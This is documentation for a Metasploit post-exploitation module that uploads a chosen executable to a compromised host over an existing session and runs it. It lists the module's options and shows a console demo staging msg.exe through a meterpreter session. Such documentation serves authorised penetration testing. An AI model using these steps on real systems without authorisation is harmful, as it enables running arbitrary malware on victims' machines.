This module allows you to upload a binary file, and automatically execute it.

## Vulnerable Application

The following platforms are supported:


* Windows
* Linux
* OS X

## Verification Steps

1. Prepare for an executable file you wish to upload and execute.
2. Obtain a session from the target machine.
3. In msfconsole, do ```use post/multi/manage/upload_exec```
4. Set the ```LFILE``` option
5. Set the ```RFILE``` option
6. Set the ```SESSION``` option
7. ```run```

## Options

**LFILE**

The file on your machine that you want to upload to the target machine.

**RFILE**

The file path on the target machine. This defaults to LFILE.

## Demo

```
msf > use post/multi/manage/upload_exec
msf post(upload_exec) > show options

Module options (post/multi/manage/upload_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   LFILE                     yes       Local file to upload and execute
   RFILE                     no        Name of file on target (default is basename of LFILE)
   SESSION                   yes       The session to run this module on.

msf post(upload_exec) > set lfile /tmp/
lfile => /tmp/
msf post(upload_exec) > set lfile /tmp/msg.exe
lfile => /tmp/msg.exe
msf post(upload_exec) > set rfile C:\\Users\\sinn3r\\Desktop\\msg.exe
rfile => C:\Users\sinn3r\Desktop\msg.exe
msf post(upload_exec) > sessions

Active sessions
===============

  Id  Type                     Information                               Connection
  --  ----                     -----------                               ----------
  1   meterpreter x86/windows  WIN-6NH0Q8CJQVM\sinn3r @ WIN-6NH0Q8CJQVM  192.168.146.1:4444 -> 192.168.146.149:50168 (192.168.146.149)

msf post(upload_exec) > set session 1
session => 1

msf post(upload_exec) > run

[-] Post interrupted by the console user
[*] Post module execution completed
```
